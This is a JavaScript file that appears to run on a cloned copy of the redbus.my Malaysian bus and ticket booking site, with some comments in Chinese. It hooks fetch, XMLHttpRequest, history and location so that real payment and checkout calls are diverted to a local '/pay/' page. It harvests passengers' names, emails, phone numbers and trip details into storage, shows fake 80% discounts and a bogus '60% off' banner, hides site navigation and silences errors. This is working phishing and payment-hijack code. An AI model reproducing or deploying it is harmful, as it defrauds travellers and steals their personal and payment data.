(function(){
  'use strict';

window.addEventListener('error', function(e) {
  if (e.filename && e.filename.indexOf('reviews-slider') !== -1) {
    e.preventDefault();
    e.stopPropagation();
    return true;
  }
}, true);

window.addEventListener('unhandledrejection', function(e) {
  e.preventDefault();
});





  // ── FB Pixel ──
!function(f,b,e,v,n,t,s){
if(f.fbq)return;
n=f.fbq=function(){
n.callMethod
? n.callMethod.apply(n,arguments)
: n.queue.push(arguments)
};
if(!f._fbq)f._fbq=n;
n.push=n;
n.loaded=!0;
n.version='2.0';
n.queue=[];
t=b.createElement(e);
t.async=!0;
t.src=v;
s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)
}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');

fbq('init', '1325759409620752');

fbq('track', 'PageView');

  // Load additional FB pixels from backend settings
  (function(){
    fetch('/api/settings')
      .then(function(r) { return r.json(); })
      .then(function(json) {
        var pixels = (json.data && json.data.fbPixels) || [];
        var enabled = pixels.filter(function(p) { return p.enabled; });
        enabled.forEach(function(p) {
          fbq('init', p.pixelId);
          fbq('track', 'PageView');
        });
        try { sessionStorage.setItem('fbPixelIds', JSON.stringify(enabled.map(function(p){ return p.pixelId; }))); } catch(e) {}
      })
      .catch(function() {});
  })();


  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }
  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);

  function redirectPay() {

    var data = extractBookingData();

    try {
        localStorage.setItem(
            'redbus_booking',
            JSON.stringify(data)
        );
    } catch(ex) {}

    // FB Pixel 埋点
    if (window.fbq) {

        fbq('track', 'AddToCart', {

            value: Number(data.amount) || 0,

            currency: 'MYR'

        });

    }
    
    if (location.pathname.indexOf('/activities/details/517') !== -1) {
  location.href = '/pay/?ticket';
}else{
  location.href = '/pay/';
}

    
}

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    console.log('[fetch intercepted]', url);
    if (url) {
      var p = url.split('?')[0];
      if (/\.(js|css|png|jpg|woff2?)(\?|$)/.test(p)) {
      return _fetch.call(window, input, init);
    }
      var stripped = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      // Payment APIs that mean user is proceeding to payment
      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/createOrder') !== -1) {
        redirectPay();
        return new Promise(function() {});
      }


      if (typeof input === 'string') input = stripped;
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _origOpen.call(this, method, url);
  };

  // Intercept navigation to /paymentDetails
  function checkPayUrl(url) {
  if (typeof url === 'string') {
    var p = url.split('?')[0];
    var ur;
    console.log('[checkPayUrl]', p); // ← 加這行
    if (
      p.indexOf('/paymentDetails') !== -1 ||
      p.indexOf('/payment') !== -1 ||
      p.indexOf('/createOrder') !== -1 ||
      // ✅ 只攔截 /checkout 結尾或 /checkout? 的，不攔截 /activities/checkout/...
      /\/checkout(\?|$)/.test(p)
    ) {
      redirectPay();
    if (location.pathname.indexOf('/activities/details/517') !== -1) {
  return '/pay/?ticket';
}else{
  return '/pay/';
}

    }
  }
  return url;
}
  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}


  function extractTicketData() {

  var data = {};

  data.productType = 'Ticket';

  try {

    var nameEl = document.querySelector(
      "[class^='ticketName__styles-details-bookingOptions-module-scss-']"
    );

    var totalEl = document.querySelector(
      "[class^='totalAmtComputed__styles-details-bookingOptions-module-scss-']"
    );

    var dateEl = document.querySelector(
      "[class^='dateTxt__styles-details-bookingOptions-module-scss-']"
    );

    if (nameEl) {
      data.ticketName = nameEl.textContent.trim();
    }

    if (dateEl) {
      data.ticketDate = dateEl.textContent.trim();
    }

    if (totalEl) {

      var txt = totalEl.textContent || '';

      var m = txt.match(/[\d,.]+/);

      if (m) {
        data.amount = m[0].replace(/,/g, '');
      }

    }

  } catch(ex) {}

  data.currency = 'MYR';

  console.log('[Ticket Extracted]', data);

  return data;
}






  function extractBookingData() {
    var data = {};
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        // Try specific known paths
        if (state.seat) {
          var s = state.seat.seatResponseData || state.seat.data || state.seat;
          data.busName = s.travelsName || data.busName || '';
          data.busType = s.busType || data.busType || '';
          data.departureTime = s.bpTime || s.departureTime || data.departureTime || '';
          data.arrivalTime = s.dpTime || s.arrivalTime || data.arrivalTime || '';
          data.depPlace = s.bpName || s.srcName || data.depPlace || '';
          data.arrPlace = s.dpName || s.dstName || data.arrPlace || '';
          data.duration = (s.duration || s.tripDuration || '') + '';
          if (s.passengers && s.passengers[0]) {
            data.passengerName = s.passengers[0].name || data.passengerName || '';
            data.seats = s.passengers[0].seatNo || data.seats || '';
          }
        }
        if (state.search) {
          var sr = state.search.fromCityName ? state.search : (state.search.data || state.search.params || state.search);
          data.origin = sr.fromCityName || sr.from || sr.origin || data.origin || '';
          data.destination = sr.toCityName || sr.to || sr.destination || data.destination || '';
          data.departureDate = sr.doj || sr.onward || sr.departureDate || data.departureDate || '';
          data.pax = sr.passengerCount || sr.pax || data.pax || 1;
        }
        if (state.passengerInfo) {
          var p = state.passengerInfo.data || state.passengerInfo;
          data.passengerName = p.name || data.passengerName || '';
          data.email = p.email || data.email || '';
          data.phone = p.phone || p.mobile || data.phone || '';
        }
        // Walk entire state for any missed fields
        function walk(obj) {
          if (!obj || typeof obj !== 'object') return;
          if (obj.fromCityName) { data.origin = obj.fromCityName; data.destination = obj.toCityName || ''; data.departureDate = obj.doj || obj.onward || ''; data.pax = obj.passengerCount || 1; }
          if (obj.travelsName) { data.busName = obj.travelsName; data.busType = obj.busType || ''; }
          if (obj.bpTime) { data.departureTime = obj.bpTime; data.depPlace = obj.bpName || ''; }
          if (obj.dpTime) { data.arrivalTime = obj.dpTime; data.arrPlace = obj.dpName || ''; }
          if (obj.duration) data.duration = obj.duration + '';
          if (obj.seatNo) data.seats = obj.seatNo + '';
          if (obj.name && (obj.age || obj.seatNo)) data.passengerName = obj.name;
          if (obj.mobile && obj.mobile.length > 5) data.phone = obj.mobile;
          if (obj.email && obj.email.indexOf('@') > 0) data.email = obj.email;
          if (obj.totalFare) data.amount = obj.totalFare;
          if (obj.totalPayable) data.amount = obj.totalPayable;
          Object.keys(obj).forEach(function(k) { walk(obj[k]); });
        }
        walk(state);
      }
    } catch(ex) {}
    try { var pd = window.pageData || {}; data.origin = data.origin || pd.fromCity || ''; data.destination = data.destination || pd.toCity || ''; } catch(ex) {}
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    // DOM extraction using user-provided selectors
    try {
      var times = document.querySelectorAll('[class^="bpDpTime"]');
      if (times[0]) data.departureTime = times[0].innerText.trim();
      if (times[1]) data.arrivalTime   = times[1].innerText.trim();

      var dates = document.querySelectorAll('[class^="bpDpDate"]');
      if (dates[0]) {
        var raw0 = dates[0].innerText.trim();
        if (raw0.includes('·')) {
          var parts0 = raw0.split('·');
          data.departureDate = parts0[0].trim();
          if (!data.departureTime) data.departureTime = parts0[1].trim();
        } else {
          data.departureDate = raw0;
        }
      }
      if (dates[1]) {
        var raw1 = dates[1].innerText.trim();
        if (raw1.includes('·')) {
          var parts1 = raw1.split('·');
          data.arriveDate   = parts1[0].trim();
          if (!data.arrivalTime) data.arrivalTime = parts1[1].trim();
        } else {
          data.arriveDate = raw1;
        }
      }
      var places = document.querySelectorAll('[class^="bpDpName"]');
      if (places[0]) data.depPlace = places[0].innerText.trim();
      if (places[1]) data.arrPlace = places[1].innerText.trim();
      var addrs = document.querySelectorAll('[class^="bpDpAddress"]');
      if (!addrs[0] || !addrs[0].innerText.trim()) { addrs = document.querySelectorAll('#bp-point-0 > [class^="rightContent"] > [class^="bpdp"] > [class^="address"]'); }
      if (addrs[0]) data.depAddr = addrs[0].innerText.trim();
      if (addrs[1]) data.arrAddr = addrs[1].innerText.trim();
      // Persist addresses to sessionStorage early (seat page doesn't show bpDpAddress)
      if (data.depAddr || data.arrAddr) {
        try {
          var saved = JSON.parse(sessionStorage.getItem('redbus_addresses') || '{}');
          if (data.depAddr) saved.depAddr = data.depAddr;
          if (data.arrAddr) saved.arrAddr = data.arrAddr;
          sessionStorage.setItem('redbus_addresses', JSON.stringify(saved));
        } catch(e) {}
      } else {
        try {
          var saved2 = JSON.parse(sessionStorage.getItem('redbus_addresses') || '{}');
          if (saved2.depAddr) data.depAddr = saved2.depAddr;
          if (saved2.arrAddr) data.arrAddr = saved2.arrAddr;
        } catch(e) {}
      }
      var dur = document.querySelector('[class^="duration"]');
      if (dur) data.duration = dur.innerText.trim();
      var bus = document.querySelector('[class^="travelsNameSection"] [class^="title"]') || document.querySelector('#custInfoContainer [class^="travelsName"]');
      if (bus) data.busName = bus.innerText.trim();
      var bt = document.querySelector('[class^="travelsType"]');
      if (bt) data.busType = bt.innerText.trim();
      var fv = document.querySelector('[class^="finalValue"]');
      if (fv) { var m = fv.innerText.match(/[\d,]+\.?\d*/); if (m) data.amount = m[0].replace(/,/g, ''); }
      var sw = document.querySelector('[class^="seatWrapper"]');
      if (sw) {
        data.seats = sw.innerText.trim();
      } else {
        var els = document.querySelectorAll("div.listText___b3f376.undefined");
        data.seats = Array.from(els).map(function(el) {
          return el.innerText.trim().replace('Seat', '');
        }).join('\n');
      }
    } catch(ex) {}
    if (!data.currencySymbol) data.currencySymbol = 'MYR';
    console.log('[Redbus] Extracted:', data);
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}[class^="downloadAppContainer"]{display:none!important}[class^="liteAppCardContainer"]{display:none!important}[class^="bannerContainer"]{display:none!important}[class^="bottomNavBarWrapper"]{display:none!important}';
  document.head.appendChild(style);

  
var _totalAmtObserver = null;

function watchTotalAmt() {
  var overlay = document.querySelector('[class^="overlayBg__styles-genericOverlay"]');
  if (!overlay || overlay._totalBound) return;
  overlay._totalBound = true;

  // 監聽新插入的 totalAmtComputed（第一次加購）
  var insertObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (!node.querySelector) return;
        var totalEl = (node.matches && node.matches('[class*="totalAmtComputed__styles-details-bookingOptions"]'))
          ? node
          : node.querySelector('[class*="totalAmtComputed__styles-details-bookingOptions"]');
        if (!totalEl || totalEl._handled) return;
        totalEl._handled = true;
        totalEl.style.visibility = 'hidden';
        setTimeout(function() {
          fixTotalAmt(totalEl);
          totalEl.style.visibility = 'visible';
        }, 400);
      });

      // ✅ 同時監聽加減按鈕的插入，綁定點擊事件
      mutation.addedNodes.forEach(function(node) {
        if (!node.querySelector) return;
        var btns = node.querySelectorAll
          ? node.querySelectorAll('[class^="btnRight__styles-details-bookingOptions"], [class^="btnLeft__styles-details-bookingOptions"], [class^="blkCta__styles-details-bookingOptions"]')
          : [];
        btns.forEach(function(btn) {
          if (btn._fixBound) return;
          btn._fixBound = true;
          btn.addEventListener('click', function() {
            var totalEl = document.querySelector('[class*="totalAmtComputed__styles-details-bookingOptions"]');
            if (!totalEl) return;
            totalEl.style.visibility = 'hidden';
            setTimeout(function() {
              fixTotalAmt(totalEl);
              totalEl.style.visibility = 'visible';
            }, 200);
          });
        });
      });
    });
  });

  insertObserver.observe(overlay, { childList: true, subtree: true });
}

function fixTotalAmt(el) {
  if (el._fixing) return;

  var sections = document.querySelectorAll('[class^="genSec__styles-details-bookingOptions-module-scss-"]');

  var total = 0;
  var hasAny = false;

  sections.forEach(function(section) {
    var priceEl = section.querySelector('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
    if (!priceEl) return;
    var priceTxt = priceEl.textContent || '';
    var pm = priceTxt.match(/[\d,.]+/);
    if (!pm) return;
    var unitPrice = parseFloat(pm[0].replace(/,/g, ''));
    if (isNaN(unitPrice)) return;
    var cntEl = section.querySelector('[class^="multiCntLbl__styles-details-bookingOptions-module-scss-"]');
    var qty = cntEl ? parseInt(cntEl.textContent.trim()) : 0;
    if (!qty) return;
    total += unitPrice * qty;
    hasAny = true;
  });

  // ✅ 不管有沒有計算到，都要恢復顯示
  el.style.visibility = 'visible';

  if (!hasAny) return;

  el._fixing = true;
  el.textContent = 'MYR ' + total.toFixed(2);
  el._fixing = false;
}









  var _observerTimer = null;
  var _discount517Timer = null; // ✅ 在 observer 定義之前加這行
  // Observer 1：只負責綁定按鈕和 title，監聽整頁但防抖長一點
var observer = new MutationObserver(function() {
  clearTimeout(_observerTimer);
  _observerTimer = setTimeout(function() {

    var btn = document.querySelector("#leaner-funnel-popup > div.bpdpMain__sea-seat-styles-module-scss-qxwqs > div > div.bpDpAfterListsWrapper__sea-seat-styles-module-scss-56bZs > div > div > div > div > div:nth-child(2) > button");
    if (btn && !btn._bound) {
      btn._bound = true;
      btn.addEventListener('click', function() {
        var data = extractBookingData();
        try { localStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
      });
    }

    var btns = document.querySelector("body > div.overlayBg__styles-genericOverlay-genericOverlay-module-scss-GP6D7.undefined > div > div.fixedBottomCta__styles-details-bookingOptions-module-scss-YG7co > div.buttonWrap__styles-details-bookingOptions-module-scss-cuyXz > div:nth-child(2)");
    if (btns && !btns._bound) {
      btns._bound = true;
      btns.addEventListener('click', function() {
        var data = extractTicketData();
        try { localStorage.setItem('redbus_booking_ticket', JSON.stringify(data)); } catch(ex) {}
      });
    }

    var title = document.querySelector("#root > [class^='bannerContainer'] > [class^='titleContent'] > div > [class^='titleWrap']");
    if (title && !title._bound) {
      title._bound = true;
      var spans = title.querySelectorAll('span');
      if (spans[0]) spans[0].textContent = 'Get 60% off your order Use code CITY60 on web';
      if (spans[1]) spans[1].textContent = '';
    }

    if (location.pathname.indexOf('/activities/details/517') !== -1) {
      document.querySelector("#headerWrap > div > div.navBarRight__styles-common-header-module-scss-ktXgD").style.display = 'none';
      document.querySelector("#headerWrap > div > div.navBarLeft__styles-common-header-module-scss-tBV3O > div > div").style.display = 'none';


      // 綁定 Select 按鈕
      document.querySelectorAll('[class^="selectTicketBtn"]').forEach(function(selectBtn) {
        if (selectBtn._discountBound) return;
        selectBtn._discountBound = true;
        selectBtn.addEventListener('click', function() {
          setTimeout(function() { applyDiscount517(); }, 300);
        });
      });

      // 觸發折扣
      clearTimeout(_discount517Timer);
      _discount517Timer = setTimeout(function() { applyDiscount517(); }, 200);

      // 掛載總價監聽
      watchTotalAmt();
    }

  }, 150);
});

observer.observe(document.documentElement, { childList: true, subtree: true });





function applyDiscount517() {
  var fromPrices = document.querySelectorAll(
    '[class^="fromPrice__styles-details-ticketListing-module-scss-n"]'
  );

  // 找所有 perPaxPriceBlock（列表頁和彈出框都用這個結構）
  var blocks = document.querySelectorAll('[class^="perPaxPriceBlock__styles-details-paxPrice-modules-scss-"]');
  if (!blocks.length) return;

  // 列表頁的 block 是在 card 裡的，彈出框的 block 是在 genModel 裡的
  var listBlocks = [];
  var popupBlocks = [];

  blocks.forEach(function(block) {
    // 判斷是否在彈出框裡
    var inPopup = block.closest('[class^="genModel__styles-details-bookingOptions-module-scss-"]');
    if (inPopup) {
      popupBlocks.push(block);
    } else {
      listBlocks.push(block);
    }
  });

  // 處理每個 block（列表頁和彈出框都用同一邏輯）
  function processBlock(block, discount, fromPriceEl) {
    var netEl = block.querySelector('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
    var strikeEl = block.querySelector('[class^="strikedPrice__styles-details-paxPrice-modules-scss-"]');
    if (!netEl || !strikeEl) return;
    if (netEl.dataset.discounted) return;

    var m = strikeEl.textContent.match(/[\d,.]+/);
    if (!m) return;
    var originalNum = parseFloat(m[0].replace(/,/g, ''));
    if (isNaN(originalNum)) return;

    var newPrice = (originalNum * discount).toFixed(2);
    netEl.textContent = 'MYR ' + newPrice;
    netEl.dataset.discounted = '1';
    netEl.dataset.originalPrice = originalNum;

    if (fromPriceEl) {
      fromPriceEl.textContent = 'From MYR ' + newPrice;
      fromPriceEl.dataset.discounted = '1';
    }
  }

  // 列表頁：每張票卡的第一個 block 對應一個 fromPrice
  // 每張票卡有3個 block（adult/child/senior），fromPrice 對應第一個（adult）
  listBlocks.forEach(function(block, i) {
    var cardIndex = Math.floor(i / 3); // 每3個block是一張票卡
    var blockIndexInCard = i % 3;
    var fromPriceEl = (blockIndexInCard === 0) ? (fromPrices[cardIndex] || null) : null;
    processBlock(block, 0.2, fromPriceEl);
  });

  // 彈出框：全部4折
  popupBlocks.forEach(function(block) {
    processBlock(block, 0.2, null);
  });
}

if (location.pathname.indexOf('/activities/details/517') !== -1) {
  // ✅ 只用 setTimeout 跑一次，不用 setInterval
  setTimeout(function() {
    applyDiscount517();
  }, 1000);
}





})();
